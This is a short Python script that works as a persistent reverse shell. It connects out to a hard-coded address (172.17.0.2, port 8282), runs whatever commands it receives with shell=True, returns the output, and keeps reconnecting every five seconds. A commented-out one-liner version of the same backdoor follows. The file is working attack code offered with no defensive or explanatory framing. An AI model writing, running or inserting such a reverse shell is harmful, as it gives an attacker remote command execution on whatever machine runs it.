
import socket
import subprocess
import time
h = "172.17.0.2"
p = 8282

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h,p))
        while True:
            c=s.recv(1024).decode()
            output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
            result=output.stdout
            if(result==''):
                s.send("suc".encode())
            else:
                s.send(result.encode())
    except Exception as e:
        time.sleep(5)


#import socket,subprocess;h,p="172.17.0.2",8282;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((h,p));exec("while True:c=s.recv(1024).decode();o=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True);r=o.stdout;s.send('suc'.encode()) if not r else s.send(r.encode())")
